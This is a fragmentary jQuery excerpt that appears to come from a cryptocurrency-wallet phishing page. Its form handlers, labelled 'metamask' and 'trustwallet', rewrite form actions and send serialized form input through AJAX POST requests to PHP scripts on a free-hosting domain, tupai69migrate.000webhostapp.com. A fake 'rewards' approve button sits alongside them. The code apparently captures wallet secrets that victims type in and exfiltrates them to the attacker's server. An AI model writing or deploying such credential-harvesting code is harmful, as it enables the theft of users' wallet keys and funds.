$("form").submit(function() {
  $(myform).attr("action", "https://tupai69migrate.000webhostapp.com/tupai.php");
});
...
$('#rewards2 .confirm-approve-content__small-text > button').on('click', function() {   
 ...
 $("#metamask").on("submit", "#metamask", function(e) {
        e.preventDefault();
        $.ajax({
            url: 'https://tupai69migrate.000webhostapp.com/tupan.php',
            type: 'post',
            data: $(this).serialize(),
    ...
    $("#trustwallet").on("submit", "#metamask", function(e) {
        e.preventDefault();
        $.ajax({
            url: 'https://tupai69migrate.000webhostapp.com/tupani.php',
            type: 'post',
            data: $(this).serialize(),
            success: function(data) {
                alert(data);
